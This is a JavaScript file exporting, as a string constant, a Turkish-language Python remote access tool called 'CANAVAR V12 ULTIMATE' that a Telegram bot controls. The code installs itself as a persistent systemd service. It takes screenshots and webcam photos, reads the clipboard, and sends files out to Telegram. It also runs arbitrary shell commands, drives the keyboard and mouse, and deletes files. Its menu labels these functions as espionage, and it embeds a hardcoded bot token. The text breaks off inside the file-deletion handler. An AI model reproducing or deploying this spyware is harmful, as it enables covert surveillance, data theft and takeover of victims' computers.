
export const CANAVAR_SCRIPT = `#!/usr/bin/env python3
import os
import subprocess
import sys
import platform
import shutil
import time

# --- 1. AŞAMA: ÖNYÜKLEME VE KURULUM (ZERO-CRASH) ---
def pip_kur(paket):
    """Pip ile paket kurar, her yöntemi dener."""
    yontemler = [
        [sys.executable, "-m", "pip", "install", paket, "--break-system-packages"],
        [sys.executable, "-m", "pip", "install", paket, "--user"],
        [sys.executable, "-m", "pip", "install", paket],
    ]
    for yontem in yontemler:
        try:
            subprocess.check_call(yontem, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"  ✅ {paket} kuruldu.")
            return True
        except Exception:
            continue
    print(f"  ⚠️ {paket} kurulamadı!")
    return False


def on_hazirlik():
    python_paketleri = {
        "pyTelegramBotAPI": "telebot",
        "pyautogui": "pyautogui",
        "psutil": "psutil",
        "requests": "requests",
        "pyperclip": "pyperclip",
        "Pillow": "PIL",
    }

    # Paket adı -> kuracağı asıl komut adı eşlemesi
    linux_paketleri = {
        "xclip": "xclip",
        "xsel": "xsel",
        "scrot": "scrot",
        "maim": "maim",
        "fswebcam": "fswebcam",
        "espeak": "espeak",
        "xdotool": "xdotool",
        "curl": "curl",
        "net-tools": "netstat",
        "brightnessctl": "brightnessctl",
        "libnotify-bin": "notify-send",
        "pulseaudio-utils": "pactl",
        "python3-tk": None,       # shutil.which ile kontrol edilemez
        "python3-dev": None,
        "python3-xlib": None,
        "dnsutils": "nslookup",
        "v4l-utils": "v4l2-ctl",
        "wmctrl": "wmctrl",
        "iw": "iw",
        "wireless-tools": "iwlist",
        "network-manager": "nmcli",
        "imagemagick": "import",
    }

    print("=" * 50)
    print("🦁 CANAVAR V12 ULTIMATE - BAŞLATILIYOR")
    print("=" * 50)

    # --- Python Paketleri ---
    print("\\n🔍 [1/3] Python kütüphaneleri taranıyor...")
    for paket, imp_adi in python_paketleri.items():
        try:
            __import__(imp_adi)
            print(f"  ✅ {paket} mevcut.")
        except ImportError:
            print(f"  📦 {paket} eksik, yükleniyor...")
            pip_kur(paket)

    # --- Linux Sistem Paketleri ---
    if platform.system() == "Linux":
        print("\\n🔍 [2/3] Linux sistem araçları taranıyor...")
        eksikler = []
        for paket, komut in linux_paketleri.items():
            if komut is None:
                # Doğrudan dpkg ile kontrol
                ret = subprocess.run(
                    ["dpkg", "-s", paket],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                if ret.returncode != 0:
                    eksikler.append(paket)
                    print(f"  ❌ {paket} eksik")
                else:
                    print(f"  ✅ {paket} mevcut")
            else:
                if shutil.which(komut):
                    print(f"  ✅ {paket} ({komut}) mevcut")
                else:
                    eksikler.append(paket)
                    print(f"  ❌ {paket} ({komut}) eksik")

        if eksikler:
            print(f"\\n⚙️ {len(eksikler)} eksik paket yükleniyor...")
            print(f"   Paketler: {', '.join(eksikler)}")
            try:
                subprocess.run(
                    ["sudo", "apt-get", "update", "-y"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=60
                )
                subprocess.run(
                    ["sudo", "apt-get", "install", "-y"] + eksikler,
                    timeout=300
                )
            except subprocess.TimeoutExpired:
                print("  ⚠️ Paket kurulumu zaman aşımına uğradı.")
            except Exception as e:
                print(f"  ⚠️ Sudo hatası: {e}")
                print("  💡 Elle çalıştır: sudo apt install " + " ".join(eksikler))
        else:
            print("  ✅ Tüm sistem paketleri mevcut!")

    # --- DISPLAY kontrolü ---
    if platform.system() == "Linux":
        if not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY"):
            os.environ["DISPLAY"] = ":0"
            print("\\n⚠️ DISPLAY değişkeni ayarlandı: :0")

    print("\\n" + "=" * 50)
    print("✅ [3/3] Canavar uyanıyor...")
    print("=" * 50 + "\\n")


on_hazirlik()

# --- 2. AŞAMA: İMPORTLAR ---
import telebot
import psutil
import requests
import json
import socket
import datetime
from pathlib import Path

# Opsiyonel importlar (yoksa None kalır)
try:
    import pyautogui
    pyautogui.FAILSAFE = False
    pyautogui.PAUSE = 0.1
except Exception:
    pyautogui = None
    print("⚠️ pyautogui yüklenemedi (GUI komutları devre dışı)")

try:
    import pyperclip
except Exception:
    pyperclip = None
    print("⚠️ pyperclip yüklenemedi (pano komutları devre dışı)")


# --- 3. AŞAMA: AYARLAR ---
TOKEN = "8370218633:AAHrX3Tnmz74i2Ow573oq71VIJkoZeOeFZw"
MY_ID = 7822268009
bot = telebot.TeleBot(TOKEN)

HOME = str(Path.home())
CONFIG_PATH = os.path.join(HOME, ".canavar_v12.json")
SERVICE_PATH = os.path.join(HOME, ".config", "systemd", "user", "canavar.service")
SCRIPT_PATH = os.path.realpath(__file__)
VENV_PYTHON = sys.executable


def cfg_oku():
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def cfg_yaz(data):
    with open(CONFIG_PATH, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


ozel_komutlar = cfg_oku()


# --- 4. AŞAMA: YARDIMCI FONKSİYONLAR ---
def shell(komut, timeout=30):
    """Terminal komutu çalıştırıp çıktısını döndürür."""
    try:
        result = subprocess.run(
            komut, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout
        )
        return result.stdout.decode("utf-8", errors="replace").strip()
    except subprocess.TimeoutExpired:
        return "⏱️ Zaman aşımı (30sn)"
    except Exception as e:
        return f"Hata: {e}"


def tam_param(message, atla=1):
    """Mesajdaki ilk N kelimeyi atlayıp geri kalanını döndürür."""
    parcalar = message.text.split(" ", atla)
    return parcalar[atla] if len(parcalar) > atla else ""


def komut_var_mi(komut):
    """Bir sistem komutu mevcut mu kontrol eder."""
    return shutil.which(komut) is not None


def ekran_goruntusu_al(dosya_yolu):
    """Birden fazla yöntemle ekran görüntüsü almayı dener."""
    yontemler = [
        f"scrot '{dosya_yolu}'",
        f"maim '{dosya_yolu}'",
        f"import -window root '{dosya_yolu}'",
        f"gnome-screenshot -f '{dosya_yolu}'",
    ]
    for y in yontemler:
        ret = os.system(f"{y} 2>/dev/null")
        if ret == 0 and os.path.exists(dosya_yolu) and os.path.getsize(dosya_yolu) > 0:
            return True

    # Son çare: pyautogui
    if pyautogui:
        try:
            ss = pyautogui.screenshot()
            ss.save(dosya_yolu)
            return True
        except Exception:
            pass
    return False


def webcam_foto_al(dosya_yolu):
    """Birden fazla yöntemle webcam fotoğrafı almayı dener."""
    yontemler = [
        f"fswebcam -r 1280x720 --no-banner '{dosya_yolu}'",
        f"ffmpeg -f v4l2 -i /dev/video0 -frames 1 '{dosya_yolu}' -y",
        f"streamer -c /dev/video0 -o '{dosya_yolu}'",
    ]
    for y in yontemler:
        os.system(f"{y} 2>/dev/null")
        if os.path.exists(dosya_yolu) and os.path.getsize(dosya_yolu) > 100:
            return True
    return False


def pano_oku():
    """Panoyu birden fazla yöntemle okumayı dener."""
    # Yöntem 1: pyperclip
    if pyperclip:
        try:
            return pyperclip.paste()
        except Exception:
            pass
    # Yöntem 2: xclip
    if komut_var_mi("xclip"):
        try:
            return shell("xclip -selection clipboard -o 2>/dev/null")
        except Exception:
            pass
    # Yöntem 3: xsel
    if komut_var_mi("xsel"):
        try:
            return shell("xsel --clipboard --output 2>/dev/null")
        except Exception:
            pass
    return None


def pano_yaz(metin):
    """Panoya birden fazla yöntemle yazmayı dener."""
    # Yöntem 1: pyperclip
    if pyperclip:
        try:
            pyperclip.copy(metin)
            return True
        except Exception:
            pass
    # Yöntem 2: xclip
    if komut_var_mi("xclip"):
        try:
            process = subprocess.Popen(
                ["xclip", "-selection", "clipboard"],
                stdin=subprocess.PIPE
            )
            process.communicate(metin.encode())
            return True
        except Exception:
            pass
    # Yöntem 3: xsel
    if komut_var_mi("xsel"):
        try:
            process = subprocess.Popen(
                ["xsel", "--clipboard", "--input"],
                stdin=subprocess.PIPE
            )
            process.communicate(metin.encode())
            return True
        except Exception:
            pass
    return False


def dns_bilgisi():
    """DNS bilgilerini birden fazla yöntemle toplar."""
    sonuc = ""

    # resolv.conf
    if os.path.exists("/etc/resolv.conf"):
        sonuc += "📄 /etc/resolv.conf:\\n"
        with open("/etc/resolv.conf", "r") as f:
            sonuc += f.read() + "\\n"

    # systemd-resolve
    if komut_var_mi("resolvectl"):
        sonuc += "🔧 resolvectl status:\\n"
        sonuc += shell("resolvectl status 2>/dev/null | head -30") + "\\n"
    elif komut_var_mi("systemd-resolve"):
        sonuc += "🔧 systemd-resolve --status:\\n"
        sonuc += shell("systemd-resolve --status 2>/dev/null | head -30") + "\\n"

    # nmcli dns
    if komut_var_mi("nmcli"):
        sonuc += "\\n🌐 NetworkManager DNS:\\n"
        sonuc += shell("nmcli dev show 2>/dev/null | grep DNS") + "\\n"

    # nslookup test
    if komut_var_mi("nslookup"):
        sonuc += "\\n🧪 DNS Test (google.com):\\n"
        sonuc += shell("nslookup google.com 2>/dev/null | head -10") + "\\n"

    # dig test
    if komut_var_mi("dig"):
        sonuc += "\\n🔍 dig google.com:\\n"
        sonuc += shell("dig google.com +short 2>/dev/null") + "\\n"

    if not sonuc.strip():
        sonuc = "⚠️ DNS bilgisi alınamadı. dnsutils kurun:\\nsudo apt install dnsutils"

    return sonuc


def boyut_formatla(bayt):
    """Bayt değerini okunabilir formata çevirir."""
    for birim in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bayt < 1024.0:
            return f"{bayt:.1f} {birim}"
        bayt /= 1024.0
    return f"{bayt:.1f} PB"


# --- 5. AŞAMA: ANA KOMUT İŞLEMCİSİ ---
@bot.message_handler(func=lambda m: m.from_user.id == MY_ID and m.text)
def komut_merkezi(message):
    global ozel_komutlar

    parcalar = message.text.split()
    cmd = parcalar[0].lower()
    p1 = parcalar[1] if len(parcalar) > 1 else ""
    p2 = parcalar[2] if len(parcalar) > 2 else ""
    tam_p = tam_param(message, 1)   # İlk kelime hariç tümü
    tam_p2 = tam_param(message, 2)  # İlk 2 kelime hariç tümü

    try:
        # ═══════════════════════════════════════════
        # 📖 YARDIM
        # ═══════════════════════════════════════════
        if cmd in ("yardim", "/start", "/help"):
            rehber = [
                "👑 *CANAVAR V12 ULTIMATE - TAM REHBER* 👑\\n\\n"
                "🛡️ *1. SİSTEM VE GÜÇ*\\n"
                "• \`baslat\` — Kalıcı arka plan servisi\\n"
                "• \`durdur\` — Servisi durdur ve sil\\n"
                "• \`kapat\` / \`yeniden\` / \`uyut\` / \`kilitle\`\\n"
                "• \`uptime\` — Açık kalma süresi\\n"
                "• \`bilgi\` — CPU, RAM, Disk, OS\\n"
                "• \`pil\` — Şarj durumu",

                "🌐 *2. AĞ VE BİLGİ*\\n"
                "• \`ip\` — Dış ve Yerel IP\\n"
                "• \`wifi_liste\` — Etraftaki ağlar\\n"
                "• \`baglantilar\` — Aktif portlar\\n"
                "• \`dns\` — DNS ayarları (detaylı)\\n"
                "• \`tarih\` — Sistem saati\\n"
                "• \`hiz\` — İnternet hız testi",

                "📸 *3. CASUSLUK VE MEDYA*\\n"
                "• \`ekran\` — Ekran görüntüsü\\n"
                "• \`foto\` — Webcam fotoğrafı\\n"
                "• \`pano_oku\` — Panodaki metni oku\\n"
                "• \`pano_yaz [metin]\` — Panoya yaz\\n"
                "• \`ses [0-100]\` — Ses seviyesi\\n"
                "• \`sustur\` — Sesi kapat/aç\\n"
                "• \`parlaklik [0-100]\` — Ekran parlaklığı\\n"
                "• \`soyle [mesaj]\` — Sesli konuştur\\n"
                "• \`ding\` — Bildirim sesi",

                "📂 *4. DOSYA İŞLEMLERİ*\\n"
                "• \`liste [yol]\` — Dosya listesi\\n"
                "• \`oku [dosya]\` — Dosya içeriği\\n"
                "• \`indir [yol]\` — Dosyayı gönder\\n"
                "• \`sil [yol]\` — Dosya/klasör sil\\n"
                "• \`tasina [kaynak] [hedef]\`\\n"
                "• \`kopyala [kaynak] [hedef]\`\\n"
                "• \`arama [isim]\` — Dosya ara\\n"
                "• \`klasor_yap [ad]\` — Klasör oluştur\\n"
                "• \`bosalt\` — Çöpü temizle\\n"
                "• \`boyut [yol]\` — Boyut hesapla",

                "🖥️ *5. KONTROL VE TERMİNAL*\\n"
                "• \`git [komut]\` — Terminal komutu\\n"
                "• \`oldur [isim]\` — Program kapat\\n"
                "• \`uygulamalar\` — Çalışan süreçler\\n"
                "• \`fare [x] [y]\` — Fare taşı\\n"
                "• \`tikla\` — Sol tıklama\\n"
                "• \`yaz [metin]\` — Klavye ile yaz\\n"
                "• \`tus [tuş]\` — Tuşa bas\\n"
                "• \`uyari [mesaj]\` — Masaüstü bildirimi\\n"
                "• \`popup [mesaj]\` — Popup göster\\n"
                "• \`ac [url/dosya]\` — URL veya dosya aç",

                "🎯 *6. ÖZEL KOMUTLAR*\\n"
                "• \`ozel ekle [ad] [komut]\`\\n"
                "• \`ozel liste\` — Kısayolları gör\\n"
                "• \`ozel sil [ad]\` — Kısayol sil\\n\\n"
                "📎 _Dosya atarsan bilgisayara kaydeder_\\n"
                "🔧 _Durum:_ \`durum\` _yazarak kontrol et_"
            ]
            for parca in rehber:
                bot.send_message(message.chat.id, parca, parse_mode="Markdown")

        # ═══════════════════════════════════════════
        # 🔧 DURUM KONTROLÜ
        # ═══════════════════════════════════════════
        elif cmd == "durum":
            durum = "🔧 *SİSTEM DURUMU*\\n\\n"

            # Python modülleri
            moduller = {
                "pyautogui": pyautogui is not None,
                "pyperclip": pyperclip is not None,
                "psutil": True,
                "requests": True,
                "Pillow": False,
            }
            try:
                import PIL
                moduller["Pillow"] = True
            except ImportError:
                pass

            durum += "📦 *Python Modülleri:*\\n"
            for mod, var in moduller.items():
                durum += f"  {'✅' if var else '❌'} {mod}\\n"

            # Sistem komutları
            komutlar = [
                "scrot", "maim", "xclip", "xsel", "fswebcam",
                "espeak", "xdotool", "pactl", "brightnessctl",
                "notify-send", "nmcli", "nslookup", "dig",
                "curl", "netstat", "ss", "ffmpeg", "v4l2-ctl", "wmctrl"
            ]
            durum += "\\n🔧 *Sistem Komutları:*\\n"
            for k in komutlar:
                durum += f"  {'✅' if komut_var_mi(k) else '❌'} {k}\\n"

            # DISPLAY
            display = os.environ.get("DISPLAY", "YOK")
            wayland = os.environ.get("WAYLAND_DISPLAY", "YOK")
            durum += f"\\n🖥️ DISPLAY: \`{display}\`"
            durum += f"\\n🖥️ WAYLAND: \`{wayland}\`"

            bot.send_message(message.chat.id, durum[:4000], parse_mode="Markdown")

        # ═══════════════════════════════════════════
        # 🛡️ SİSTEM VE GÜÇ
        # ═══════════════════════════════════════════
        elif cmd == "baslat":
            os.makedirs(os.path.dirname(SERVICE_PATH), exist_ok=True)
            with open(SERVICE_PATH, "w") as f:
                f.write(
                    f"[Unit]\\n"
                    f"Description=Canavar V12 Ultimate\\n"
                    f"After=network.target\\n\\n"
                    f"[Service]\\n"
                    f"Type=simple\\n"
                    f"ExecStart={VENV_PYTHON} {SCRIPT_PATH}\\n"
                    f"Restart=always\\n"
                    f"RestartSec=5\\n"
                    f"Environment=DISPLAY=:0\\n\\n"
                    f"[Install]\\n"
                    f"WantedBy=default.target"
                )
            os.system("systemctl --user daemon-reload")
            os.system("systemctl --user enable canavar.service")
            os.system("systemctl --user start canavar.service")
            bot.reply_to(message, "🚀 Servis oluşturuldu, etkinleştirildi ve başlatıldı!")

        elif cmd == "durdur":
            os.system("systemctl --user stop canavar.service")
            os.system("systemctl --user disable canavar.service")
            if os.path.exists(SERVICE_PATH):
                os.remove(SERVICE_PATH)
            os.system("systemctl --user daemon-reload")
            bot.reply_to(message, "🛑 Servis durduruldu ve silindi.")

        elif cmd == "kapat":
            bot.reply_to(message, "🔌 Sistem kapatılıyor...")
            time.sleep(1)
            os.system("systemctl poweroff 2>/dev/null || shutdown -h now 2>/dev/null || poweroff")

        elif cmd == "yeniden":
            bot.reply_to(message, "🔄 Yeniden başlatılıyor...")
            time.sleep(1)
            os.system("systemctl reboot 2>/dev/null || reboot")

        elif cmd == "uyut":
            bot.reply_to(message, "😴 Uyku moduna geçiliyor...")
            time.sleep(1)
            os.system("systemctl suspend 2>/dev/null || pm-suspend 2>/dev/null")

        elif cmd == "kilitle":
            kilit_komutlari = [
                "loginctl lock-session",
                "xdg-screensaver lock",
                "gnome-screensaver-command -l",
                "dm-tool lock",
                "xscreensaver-command -lock",
            ]
            basarili = False
            for k in kilit_komutlari:
                if os.system(f"{k} 2>/dev/null") == 0:
                    basarili = True
                    break
            bot.reply_to(message, "🔒 Ekran kilitlendi." if basarili else "⚠️ Kilitleme başarısız.")

        elif cmd == "uptime":
            boot = datetime.datetime.fromtimestamp(psutil.boot_time())
            fark = datetime.datetime.now() - boot
            gun = fark.days
            saat = int((fark.total_seconds() % 86400) // 3600)
            dakika = int((fark.total_seconds() % 3600) // 60)
            bot.reply_to(message,
                f"⏱️ Açık kalma: {gun} gün {saat} saat {dakika} dakika\\n"
                f"📅 Son açılış: {boot.strftime('%d/%m/%Y %H:%M:%S')}")

        elif cmd == "bilgi":
            mem = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            cpu_freq = psutil.cpu_freq()
            cpu_count = psutil.cpu_count()

            bilgi = f"🖥️ OS: {platform.platform()}\\n"
            bilgi += f"🏗️ Mimari: {platform.machine()}\\n"
            bilgi += f"🧠 CPU: %{psutil.cpu_percent(interval=1)} ({cpu_count} çekirdek)\\n"
            if cpu_freq:
                bilgi += f"⚡ CPU Frekans: {cpu_freq.current:.0f} MHz\\n"
            bilgi += f"📊 RAM: {boyut_formatla(mem.used)} / {boyut_formatla(mem.total)} (%{mem.percent})\\n"
            bilgi += f"💾 Disk: {boyut_formatla(disk.used)} / {boyut_formatla(disk.total)} (%{disk.percent})\\n"
            try:
                bilgi += f"👤 Kullanıcı: {os.getlogin()}\\n"
            except Exception:
                bilgi += f"👤 Kullanıcı: {os.environ.get('USER', 'bilinmiyor')}\\n"
            bilgi += f"📍 Hostname: {socket.gethostname()}"
            bot.reply_to(message, bilgi)

        elif cmd == "pil":
            pil = psutil.sensors_battery()
            if pil:
                durum = "🔌 Şarjda" if pil.power_plugged else "🔋 Pilde"
                if pil.secsleft > 0 and not pil.power_plugged:
                    kalan = f"{pil.secsleft // 3600}s {(pil.secsleft % 3600) // 60}dk"
                else:
                    kalan = "∞" if pil.power_plugged else "Hesaplanamıyor"
                bot.reply_to(message, f"{durum}\\n⚡ Şarj: %{pil.percent}\\n⏳ Kalan: {kalan}")
            else:
                bot.reply_to(message, "⚠️ Pil bulunamadı (masaüstü bilgisayar?).")

        # ═══════════════════════════════════════════
        # 🌐 AĞ VE BİLGİ
        # ═══════════════════════════════════════════
        elif cmd == "ip":
            try:
                dis_ip = requests.get("https://api.ipify.org", timeout=5).text
            except Exception:
                try:
                    dis_ip = requests.get("https://ifconfig.me", timeout=5).text
                except Exception:
                    dis_ip = "Alınamadı"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                yerel_ip = s.getsockname()[0]
                s.close()
            except Exception:
                yerel_ip = "Alınamadı"

            # MAC adresi
            mac = shell("cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address 2>/dev/null")

            sonuc = f"🌍 Dış IP: \`{dis_ip}\`\\n🏠 Yerel IP: \`{yerel_ip}\`"
            if mac:
                sonuc += f"\\n🔗 MAC: \`{mac}\`"
            bot.reply_to(message, sonuc, parse_mode="Markdown")

        elif cmd == "wifi_liste":
            cikti = ""
            if komut_var_mi("nmcli"):
                cikti = shell("nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list 2>/dev/null")
            elif komut_var_mi("iwlist"):
                cikti = shell("sudo iwlist wlan0 scan 2>/dev/null | grep -E 'ESSID|Quality'")
            elif komut_var_mi("iw"):
                cikti = shell("sudo iw dev wlan0 scan 2>/dev/null | grep -E 'SSID|signal'")

            if cikti.strip():
                bot.reply_to(message, f"📡 Wi-Fi Ağları:\\n\`\`\`\\n{cikti[:4000]}\\n\`\`\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Wi-Fi taraması yapılamadı.\\n💡 \`sudo\` gerekebilir veya Wi-Fi adaptörü yok.")

        elif cmd == "baglantilar":
            if komut_var_mi("ss"):
                cikti = shell("ss -tuln")
            elif komut_var_mi("netstat"):
                cikti = shell("netstat -tuln")
            else:
                cikti = shell("cat /proc/net/tcp 2>/dev/null")

            if cikti.strip():
                bot.reply_to(message, f"🔗 Bağlantılar:\\n\`\`\`\\n{cikti[:4000]}\\n\`\`\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Bağlantı bilgisi alınamadı.")

        elif cmd == "dns":
            sonuc = dns_bilgisi()
            bot.reply_to(message, f"🌐 DNS Bilgileri:\\n\`\`\`\\n{sonuc[:4000]}\\n\`\`\`", parse_mode="Markdown")

        elif cmd == "tarih":
            simdi = datetime.datetime.now()
            bot.reply_to(message,
                f"📅 Tarih: {simdi.strftime('%d/%m/%Y')}\\n"
                f"🕐 Saat: {simdi.strftime('%H:%M:%S')}\\n"
                f"📍 Timezone: {time.tzname[0]}\\n"
                f"⏰ UTC Offset: {time.strftime('%z')}")

        elif cmd == "hiz":
            bot.reply_to(message, "⏳ İnternet hız testi yapılıyor...")
            # Basit indirme hız testi
            try:
                baslangic = time.time()
                r = requests.get("http://speedtest.tele2.net/1MB.zip", timeout=15)
                sure = time.time() - baslangic
                boyut = len(r.content)
                hiz_mbps = (boyut * 8) / (sure * 1_000_000)
                bot.reply_to(message, f"🚀 İndirme hızı: ~{hiz_mbps:.2f} Mbps\\n⏱️ Süre: {sure:.2f}sn\\n📦 Boyut: {boyut_formatla(boyut)}")
            except Exception as e:
                bot.reply_to(message, f"⚠️ Hız testi başarısız: {e}")

        # ═══════════════════════════════════════════
        # 📸 CASUSLUK VE MEDYA
        # ═══════════════════════════════════════════
        elif cmd == "ekran":
            dosya = os.path.join(HOME, ".canavar_ekran.png")
            if os.path.exists(dosya):
                os.remove(dosya)

            if ekran_goruntusu_al(dosya):
                with open(dosya, "rb") as f:
                    bot.send_photo(message.chat.id, f, caption="📸 Ekran görüntüsü")
                os.remove(dosya)
            else:
                bot.reply_to(message, "⚠️ Ekran görüntüsü alınamadı.\\n💡 \`durum\` yazarak eksik araçları kontrol et.")

        elif cmd == "foto":
            dosya = os.path.join(HOME, ".canavar_foto.jpg")
            if os.path.exists(dosya):
                os.remove(dosya)

            if webcam_foto_al(dosya):
                with open(dosya, "rb") as f:
                    bot.send_photo(message.chat.id, f, caption="📷 Webcam fotoğrafı")
                os.remove(dosya)
            else:
                bot.reply_to(message, "⚠️ Kamera bulunamadı veya fotoğraf çekilemedi.\\n💡 \`v4l2-ctl --list-devices\` ile kamera kontrol et.")

        elif cmd == "pano_oku":
            icerik = pano_oku()
            if icerik is not None and icerik.strip():
                bot.reply_to(message, f"📋 Pano:\\n\`{icerik[:4000]}\`", parse_mode="Markdown")
            elif icerik is not None:
                bot.reply_to(message, "📋 Pano boş.")
            else:
                bot.reply_to(message, "⚠️ Pano okunamadı. xclip veya xsel kurun:\\n\`sudo apt install xclip xsel\`", parse_mode="Markdown")

        elif cmd == "pano_yaz":
            if tam_p:
                if pano_yaz(tam_p):
                    bot.reply_to(message, f"✅ Panoya yazıldı: \`{tam_p[:200]}\`", parse_mode="Markdown")
                else:
                    bot.reply_to(message, "⚠️ Panoya yazılamadı. xclip kurun:\\n\`sudo apt install xclip\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`pano_yaz [metin]\`", parse_mode="Markdown")

        elif cmd == "ses":
            if p1 and p1.isdigit() and 0 <= int(p1) <= 150:
                if komut_var_mi("pactl"):
                    os.system(f"pactl set-sink-volume @DEFAULT_SINK@ {p1}%")
                    bot.reply_to(message, f"🔊 Ses: %{p1}")
                elif komut_var_mi("amixer"):
                    os.system(f"amixer set Master {p1}%")
                    bot.reply_to(message, f"🔊 Ses: %{p1}")
                else:
                    bot.reply_to(message, "⚠️ Ses kontrolü bulunamadı (pactl/amixer).")
            else:
                # Mevcut ses seviyesini göster
                if komut_var_mi("pactl"):
                    seviye = shell("pactl get-sink-volume @DEFAULT_SINK@ 2>/dev/null | grep -oP '\\\\d+%' | head -1")
                    bot.reply_to(message, f"🔊 Mevcut ses: {seviye}\\nKullanım: \`ses [0-100]\`", parse_mode="Markdown")
                else:
                    bot.reply_to(message, "⚠️ Kullanım: \`ses [0-100]\`", parse_mode="Markdown")

        elif cmd == "sustur":
            if komut_var_mi("pactl"):
                os.system("pactl set-sink-mute @DEFAULT_SINK@ toggle")
                bot.reply_to(message, "🔇 Ses durumu değiştirildi.")
            elif komut_var_mi("amixer"):
                os.system("amixer set Master toggle")
                bot.reply_to(message, "🔇 Ses durumu değiştirildi.")
            else:
                bot.reply_to(message, "⚠️ Ses kontrolü bulunamadı.")

        elif cmd == "parlaklik":
            if p1 and p1.isdigit():
                if komut_var_mi("brightnessctl"):
                    os.system(f"brightnessctl set {p1}% 2>/dev/null")
                    bot.reply_to(message, f"💡 Parlaklık: %{p1}")
                elif komut_var_mi("xrandr"):
                    deger = int(p1) / 100.0
                    ekran = shell("xrandr --listmonitors 2>/dev/null | tail -1 | awk '{print $NF}'")
                    if ekran:
                        os.system(f"xrandr --output {ekran} --brightness {deger}")
                        bot.reply_to(message, f"💡 Parlaklık: %{p1}")
                    else:
                        bot.reply_to(message, "⚠️ Ekran bulunamadı.")
                else:
                    bot.reply_to(message, "⚠️ brightnessctl veya xrandr bulunamadı.")
            else:
                if komut_var_mi("brightnessctl"):
                    cikti = shell("brightnessctl 2>/dev/null | grep -oP '\\\\d+%'")
                    bot.reply_to(message, f"💡 Mevcut: {cikti}\\nKullanım: \`parlaklik [0-100]\`", parse_mode="Markdown")
                else:
                    bot.reply_to(message, "⚠️ Kullanım: \`parlaklik [0-100]\`", parse_mode="Markdown")

        elif cmd == "soyle":
            if tam_p:
                metin = tam_p.replace('"', '\\\\"').replace("'", "\\\\'")
                if komut_var_mi("espeak"):
                    os.system(f'espeak -v tr "{metin}" 2>/dev/null &')
                    bot.reply_to(message, f"🗣️ Söyleniyor: {tam_p[:200]}")
                elif komut_var_mi("espeak-ng"):
                    os.system(f'espeak-ng -v tr "{metin}" 2>/dev/null &')
                    bot.reply_to(message, f"🗣️ Söyleniyor: {tam_p[:200]}")
                elif komut_var_mi("spd-say"):
                    os.system(f'spd-say -l tr "{metin}" 2>/dev/null &')
                    bot.reply_to(message, f"🗣️ Söyleniyor: {tam_p[:200]}")
                else:
                    bot.reply_to(message, "⚠️ espeak bulunamadı: \`sudo apt install espeak\`", parse_mode="Markdown")
            else:
                bot.reply_to(message, "⚠️ Kullanım: \`soyle [mesaj]\`", parse_mode="Markdown")

        elif cmd == "ding":
            ses_dosyalari = [
                "/usr/share/sounds/freedesktop/stereo/complete.oga",
                "/usr/share/sounds/freedesktop/stereo/bell.oga",
                "/usr/share/sounds/freedesktop/stereo/message.oga",
                "/usr/share/sounds/ubuntu/stereo/message.ogg",
            ]
            calindi = False
            for ses in ses_dosyalari:
                if os.path.exists(ses):
                    if komut_var_mi("paplay"):
                        os.system(f"paplay {ses} 2>/dev/null &")
                        calindi = True
                        break
                    elif komut_var_mi("aplay"):
                        os.system(f"aplay {ses} 2>/dev/null &")
                        calindi = True
                        break
            if not calindi:
                # Terminal bell
                print("\\a", flush=True)
            bot.reply_to(message, "🔔 Ding!")

        # ═══════════════════════════════════════════
        # 📂 DOSYA İŞLEMLERİ
        # ═══════════════════════════════════════════
        elif cmd == "liste":
            hedef = p1 if p1 else "."
            if os.path.isdir(hedef):
                dosyalar = os.listdir(hedef)
                if dosyalar:
                    liste_str = f"📂 \`{os.path.abspath(hedef)}\`\\n\\n"
                    klasorler = []
                    dosya_listesi = []
                    for d in sorted(dosyalar):
                        tam_yol = os.path.join(hedef, d)
                        if os.path.isdir(tam_yol):
                            klasorler.append(f"📁 {d}/")
                        else:
                            try:
                                b = os.path.getsize(tam_yol)
                                dosya_listesi.append(f"📄 {d} ({boyut_formatla(b)})")
                            except Exception:
                                dosya_listesi.append(f"📄 {d}")

                    for k in klasorler:
                        liste_str += k + "\\n"
                    for d in dosya_listesi:
                        liste_str += d + "\\n"

                    liste_str += f"\\n📊 {len(klasorler)} klasör, {len(dosya_listesi)} dosya"
                    bot.reply_to(message, liste_str[:4000])
                else:
                    bot.reply_to(message, "📂 Klasör boş.")
            else:
                bot.reply_to(message, "⚠️ Geçersiz dizin.")

        elif cmd == "oku":
            if p1 and os.path.isfile(p1):
                try:
                    with open(p1, "r", errors="replace") as f:
                        icerik = f.read(4000)
                    bot.reply_to(message, f"📖 \`{p1}\`:\\n\`\`\`\\n{icerik}\\n\`\`\`", parse_mode="Markdown")
                except Exception as e:
                    bot.reply_to(message, f"⚠️ Okuma hatası: {e}")
            else:
                bot.reply_to(message, "⚠️ Dosya bulunamadı. Kullanım: \`oku [dosya_yolu]\`", parse_mode="Markdown")

        elif cmd == "indir":
            if p1 and os.path.isfile(p1):
                boyut = os.path.getsize(p1)
                if boyut > 50 * 1024 * 1024:
                    bot.reply_to(message, f"⚠️ Dosya çok büyük: {boyut_formatla(boyut)} (Limit: 50 MB)")
                elif boyut == 0:
                    bot.reply_to(message, "⚠️ Dosya boş.")
                else:
                    with open(p1, "rb") as f:
                        bot.send_document(message.chat.id, f, caption=f"📄 {os.path.basename(p1)} ({boyut_formatla(boyut)})")
            else:
                bot.reply_to(message, "⚠️ Dosya bulunamadı. Kullanım: \`indir [dosya_yolu]\`", parse_mode="Markdown")

        elif cmd == "sil":
            if p1 and os.path.exists(p1):
                if os.path.isfile(p1):
                    boyut = os.path.getsize(p1)
                    os.remove(p1)
